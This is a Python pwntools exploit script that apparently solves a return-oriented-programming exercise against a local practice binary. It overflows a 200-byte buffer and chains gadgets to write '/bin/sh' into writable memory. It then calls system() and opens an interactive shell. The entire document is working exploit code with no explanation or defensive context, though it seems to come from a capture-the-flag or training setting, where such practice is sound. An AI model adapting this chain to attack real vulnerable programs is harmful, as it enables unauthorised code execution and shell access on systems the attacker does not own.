import Fart_ROP
from pwn import *
from analyze import *

binary = './bins2/bin-ropwrite-16'
elf = ELF(binary)

writeable_mem = elf.sym['__data_start']

# get buff
chain = b'A'*200

# /bin/sh in rdi
chain += p64(0x0000000000400883) # pop rdi; ret;
chain += b'/bin/sh\0'

# writeable mem in r9
chain += p64(0x000000000040076b) # pop r9; ret;
chain += p64(writeable_mem)

# mov /bin/sh into writable mem
chain += p64(0x0000000000400775) # mov qword ptr [r9], rdi; pop rsi; pop rbx; ret;
chain +=p64(0)*2 # rsi & rbx from ^

# specify 1st arg
chain += p64(0x0000000000400883) # pop rdi; ret;
chain += p64(writeable_mem)

# call system
chain += p64(elf.sym['system'])

io = process(binary)
io.sendline(chain)
io.interactive()
